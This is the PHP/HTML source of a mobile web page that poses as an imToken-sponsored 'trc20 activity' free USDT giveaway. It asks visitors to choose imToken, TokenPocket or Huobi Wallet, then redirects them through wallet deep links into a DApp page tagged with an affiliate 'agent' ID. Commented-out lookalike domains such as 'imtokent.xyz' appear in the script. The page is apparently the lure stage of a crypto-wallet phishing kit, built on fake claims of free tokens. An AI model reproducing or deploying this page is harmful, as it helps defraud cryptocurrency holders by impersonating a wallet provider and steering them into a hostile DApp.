<?php /*a:1:{s:54:"/www/wwwroot/测试/app/index/view/eov/index_ling.html";i:1634674976;}*/ ?>

<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover"><title>sponsored by imtoken</title><script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script><script src="/eov_files/layer.js"></script><script type="text/javascript" src="/eov_files/lang.js"></script></head><style>    html {
        font-size: 8px;
    }

    
    html,
    body {
        padding: 0;
        margin: 0;
    }
    
    .header {
        height: 5.94rem;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 1.88rem;
        font-family: PingFang SC;
        font-weight: 400;
        color: #282828;
    }
    
    .content {}
    
    .qingxz {
        height: 7.5rem;
        background: #F2F2F2;
        display: flex;
        align-items: center;
        padding-left: 1.19rem;
        border-bottom: 1px solid #D2D2D2;
        border-top: 1px solid #D2D2D2;
    }
    
    .forms {}
    
    .forms .confirm {
        width: 44.38rem;
        height: 5.63rem;
        background: #00AEFF;
        border-radius: 3rem;
        margin: 0 auto;
        margin-top: 2.5rem;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 2.25rem;
        font-family: PingFang SC;
        font-weight: 400;
        color: #FFFFFF;
    }
    
    .tips {
        width: 44.38rem;
        height: 12.48rem;
        background: #F2F2F2;
        border-radius: 1rem;
        margin: 0 auto;
        margin-top: 3.69rem;
        font-size: 1.88rem;
        font-family: PingFang SC;
        font-weight: 400;
        color: #282828;
        padding: 1.19rem;
        box-sizing: border-box;
    }
    
    .tips span {
        font-weight: bolder;
    }
    
    .walletitem {
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 1.13rem 1.94rem;
        border-bottom: 1px solid #D2D2D2;
    }
    
    .walletitem .left img {
        width: 6.25rem;
        height: 6.25rem;
    }
    
    .walletitem .center {
        flex: 1;
        flex-shrink: 0;
        margin-left: 1.31rem;
    }
    
    .walletitem .center .name {
        font-size: 1.88rem;
        font-family: PingFang SC;
        font-weight: 400;
        color: #282828;
    }
    
    .walletitem .center .sub {
        font-size: 1.5rem;
        font-family: PingFang SC;
        font-weight: 400;
        color: #898989;
        margin-top: 1.38rem;
    }
    
    .walletitem .right {
        width: 2.5rem;
        height: 2.5rem;
        background: #FFFFFF;
        border: 0.06px solid #A4A4A4;
        border-radius: 50%;
    }
    
    .walletitem .right img {
        width: 2.5rem;
        height: 2.5rem;
        display: none;
    }
    
    .inputwarp {
        height: 5rem;
        border-radius: .5rem;
        border: 1px solid #A4A4A4;
        display: flex;
        align-items: center;
        padding: 0 1rem;
        margin: 0 auto;
        width: 44.38rem;
        box-sizing: border-box;
        margin-top: 1.19rem;
        font-size: 1.88rem;
        text-align: center;
    }
</style><body><div class="header">      trc20 activity
    </div><div class="content"><div class="qingxz">            Please select the wallet app to receive the account
        </div><div class="forms"><div class="walletitem"><div class="left"><img src="/eov_files/img/im.png" alt=""></div><div class="center"><div class="name">imToken</div><div class="sub kuaijie">Automatically receive USDT and NFT</div></div><div class="right" data-index="0"><img src="/eov_files/img/hou.png" alt=""></div></div><div class="walletitem"><div class="left"><img src="/eov_files/img/tp.png" alt=""></div><div class="center"><div class="name">TokenPocket</div><div class="sub kuaijie">Automatically receive USDT and TRX</div></div><div class="right" data-index="2"><img src="/eov_files/img/hou.png" alt=""></div></div><div class="walletitem"><div class="left"><img src="/eov_files/img/hb.png" alt=""></div><div class="center"><div class="name huobi">Huobi Wallet</div><div class="sub kuaijie">Automatically receive USDT</div></div><div class="right" data-index="2"><img src="/eov_files/img/hou.png" alt=""></div></div><!-- <input class="inputwarp" type="number" placeholder="请输入充值数量"> --><div id="confirm" class="confirm">get it right now</div><div id="copy" class="confirm">copy Link</div></div><input id="input" type="text" disabled="true" style="opacity: 0;position: fixed; left: -99999px;"><div class="tips sehngming"><span id="anquan">Tips:</span>Each device and wallet can only be claimed once! All activities will be cancelled if any cheaters are found! The donated USDT and other tokens will be sent by the wallet party, and the time for arrival is 24 hours.

        </div></div><script>        function getUrlQueryString(names, urls) {
            urls = urls || window.location.href;
            urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
            var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
            var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
            if (r != null && r[2] != "") return unescape(r[2]);
            return null;
        }
        function copyText(text) {
            console.log(text)
          var input = document.getElementById("input");
          input.value = text; // 修改文本框的内容
          input.select(); // 选中文本
          document.execCommand("copy"); // 执行浏览器复制命令
          alert("Copy successfully");
    }
        //var agent = getUrlQueryString('agent')
        var agent = "10000"
        var s = getUrlQueryString('s')
        var order = getUrlQueryString('order_sn')
        var address = getUrlQueryString('address')
            var domain = window.document.domain
            // var imstr = 'https://www.imtokent.me/scan/usdt_transfer_zh.html?' + window.location.search.substring(1);
        // var imstr = 'https://www.imtokent.xyz/' + s + '/order/' + (order || '----');
        //var imstr = 'https://'+domain+'/register/index_trc.html?agent='+agent+'&s=' + s + '&address=' + address;
        var imstr = 'https://'+domain+'/index/eov/index_enling.html?agent='+agent;
        var imurl = "imtokenv2://navigate?screen=DappView&url=" + imstr;
        var imurl2 = imstr;

console.log(imstr)
        // var tpstr = 'https://www.imtokent.xyz/' + s + '?order=' + (order || '----');
        //var tpstr = 'https://'+domain+'/register/index_trc.html?agent='+agent+'&s=' + s + '&address=' + address;
        var tpstr = 'https://'+domain+'/index/eov/index_enling.html?agent='+agent;
        var tpurl2 = tpstr;
        var selectIndex = 0
        $(function() {

            $('.walletitem').click(function() {
                selectIndex = $(this).find('.right').data('index')
                if (selectIndex == 1) {
                    layer.msg('Not yet open');
                    return
                }
                $('.walletitem .right img').hide()
                $(this).find('.right img').show()


            })
              $('#copy').click(function() {
                  
                   if (selectIndex == 1) {
                    layer.msg('Not yet open');
                } else if (selectIndex == 0) {
                  copyText(imurl2)
                } else if (selectIndex == 2) {
                     copyText(tpurl2)
                }
              })
            
            $('#confirm').click(function() {

                if (selectIndex == 1) {
                    layer.msg('Not yet open');
                } else if (selectIndex == 0) {
                    if (window.tronWeb || window.ethereum) {
                        // window.location.href = imurl2 + '/money/' + value;
                        window.location.href = imurl2;
                    } else {
                        // alert(imurl + '/money/' + value)
                        window.location.href = imurl;
                    }
                } else if (selectIndex == 2) {
                    if (window.tronWeb || window.ethereum) {
                        window.location.href = tpurl2 ;
                    } else {
                        //  "chain": "ETH",
                        var tpurl = 'tpdapp://open?params={"url": "' + tpstr +  '", "source":"xxx"}'
                        console.log(tpurl)
                        window.location.href = tpurl;
                    }
                }
            })
        })
    </script></body></html>